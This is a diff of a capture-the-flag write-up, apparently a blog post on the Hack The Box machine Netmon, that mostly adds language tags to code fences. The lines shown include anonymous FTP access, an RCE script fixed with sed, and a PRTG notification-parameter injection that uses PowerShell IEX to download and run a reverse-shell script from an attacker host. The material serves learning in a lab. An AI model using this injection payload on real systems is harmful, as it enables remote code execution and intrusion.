@@ -9,7 +9,7 @@ This is a retired Windows box in the Easy category.<!--more-->
 
 As with any HTB machine I downloaded the connection pack, fired up openvpn with `ovpn wazza.ovpn` and established my TCP connection to the HTB VPN.
 Next, I started out with a basic service discovery scan using nmap with
-```
+```bash
 nmap -sV -O -F --version-light 10.10.10.152
 ```
 <div style="text-align:center"><img src="/assets/Netmon/nmap1.png" alt="Nmap Scan"/></div><br/>
@@ -18,12 +18,12 @@ Let's do a more in-depth scan and see all the services running.
 <div style="text-align:center"><img src="/assets/Netmon/nmap-depth.png" alt="Nmap Scan"/></div><br/>
 
 Let's check if anonymous FTP login is allowed with 
-```
+```bash
 ftp 10.10.10.152
 ```
 <div style="text-align:center"><img src="/assets/Netmon/ftp1.png" alt="Nmap Scan"/></div><br/>
 
-Yes! It is! Brilliant, let's get user.txt and try for root.txt.
+Yes, it is! Brilliant, let's get user.txt and try for root.txt.
 <div style="text-align:center"><img src="/assets/Netmon/ftp2.png" alt="Nmap Scan"/></div><br/>
 Turns out we aren't privileged enough so we'll have to try to escalate them somehow. Hey, atleast we got the user flag quickly :)
 
@@ -56,13 +56,13 @@ Have Burp running, if not already done, and then capture the cookie that is retu
 
 Now we have the authentication cookie - we should be able to run the RCE script without any issues. On running this on Linux, you may encounter this error:
 
-```
+```bash
 bash: ./46527.sh: /bin/bash^M: bad interpreter: No such file or directory
 ```
 
 Do not fear, a simple `sed` command will sort this out.
 
-```
+```bash
 sed -i -e 's/\r$//' 46527.sh
 ```
 Run the command again and you should be faced with this
@@ -112,7 +112,7 @@ Next, just setup a python server with the `SimpleHTTPServer` package in your wor
 
 Next, use this snippet in the notification params in PRTG.
 
-```
+```powershell
 test ; IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')
 ```
 
